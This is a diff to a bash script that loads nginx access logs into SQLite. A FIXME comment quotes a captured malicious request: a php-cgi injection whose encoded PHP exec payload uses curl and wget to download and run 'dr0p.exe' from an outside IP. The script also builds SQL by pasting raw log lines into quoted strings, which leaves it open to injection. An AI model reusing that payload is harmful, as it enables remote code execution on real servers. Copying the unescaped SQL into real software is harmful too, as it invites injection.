@@ -3,7 +3,7 @@
 # Thanks, Mac
 #!/bin/bash
 
-set -euo pipefail
+set -uo pipefail
 
 #
 # storelog - Store nginx access logs to a database.
@@ -18,13 +18,14 @@ _stderr () {
 }
 
 DB_FILE="logs.db" # TODO: Fully-qualified path.
+TABLE_NAME="logs"
 
 # Table create statement.
 # rowid is implicit.
 # Store seconds since epoch as write timestamp.
 # `legit` is a boolean.
-read -d '' CREATE_STMT <<- END_CREATE
-  CREATE TABLE IF NOT EXISTS logs(
+read -r -d '' CREATE_STMT <<- END_CREATE
+  CREATE TABLE IF NOT EXISTS ${TABLE_NAME}(
     epoch INTEGER NOT NULL,
     legit INTEGER NOT NULL DEFAULT 0,
     json TEXT NOT NULL
@@ -55,20 +56,21 @@ FAILED_PROCESSING=0
 
 create_db
 
-declare -a INSERT_LEGIT # Legitimate requests
-declare -a INSERT_JUNK  # Everything else (e.g. scans)
-INSERT_LEGIT+=("BEGIN TRANSACTION;\n")
-INSERT_JUNK+=("BEGIN TRANSACTION;\n")
+INSERT_STMT+=("BEGIN TRANSACTION;\n")
+INSERT_DATE=$(date +%s) # Seconds since epoch.
+# FIXME:
+# Error: near line 389: near "curl": syntax error
+#    389  {"time_iso8601": "2025-01-08T14:03:32+00:00", "status": 301, "request_method": "GET", "request_time": "0.000", "remote_addr": "87.120.125.13", "host": "174.138.64.31", "scheme": "http", "request_uri": "/cgi-bin/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20echo%20exec('curl%20-L%20-k%20-O%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe%20%7C%7C%20wget%20--no-check-certificate%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe');?>", "uri": "/cgi-bin/php-cgi.exe", "query_string": "arg=%0aContent-Type:%20text/plain%0a%0a<?php%20echo%20exec('curl%20-L%20-k%20-O%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe%20%7C%7C%20wget%20--no-check-certificate%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe');?>", "bytes_sent": 623, "body_bytes_sent": 162, "content_length": "", "request_length": 365, "content_type": "", "http_referer": "", "http_user_agent": "Go-http-client/1.1", "http_x_forwarded_for": "" }
+# Do we need to normalize URIs?
 for LINE in "${LOG_LINES[@]}"; do
-  local request_uri
+  legit=0 # False
   if request_uri=$(jq -e '.request_uri' <<< "${LINE}" > /dev/null 2>&1); then
-    _stmt="INSERT INTO logs (entry) VALUES ('${LINE}');\n"
-    # FIXME: Add all entries to one table; delineate legit vs everything else
+    # FIXME: This doesn't seem to be matching.
     if [[ "${request_uri}" =~ ^/hit/ ]]; then
-      INSERT_LEGIT+=("${_stmt}")
-    else
-      INSERT_JUNK+=("${_stmt}")
+      legit=1 # True
     fi
+    _stmt="INSERT INTO ${TABLE_NAME} (epoch, legit, json) VALUES (${INSERT_DATE}, ${legit}, '${LINE}');\n"
+    INSERT_STMT+=("${_stmt}")
     PROCESSED_REQUESTS=$(( PROCESSED_REQUESTS + 1 ))
   else
     # Invalid input short-circuits immediately.
@@ -76,10 +78,10 @@ for LINE in "${LOG_LINES[@]}"; do
   fi
 done
 
-if [ "${#INSERT_LEGIT[@]}" -gt "1" ]; then
-  INSERT_LEGIT+=("COMMIT;\n")
+if [ "${#INSERT_STMT[@]}" -gt "1" ]; then
+  INSERT_STMT+=("COMMIT;\n")
   # Write to the database.
-  echo -e "${INSERT_LEGIT[*]}" | sqlite3 "${DB_FILE}"
+  echo -e "${INSERT_STMT[*]}" | sqlite3 "${DB_FILE}"
 else
   _stderr "No valid logs to store"
 fi
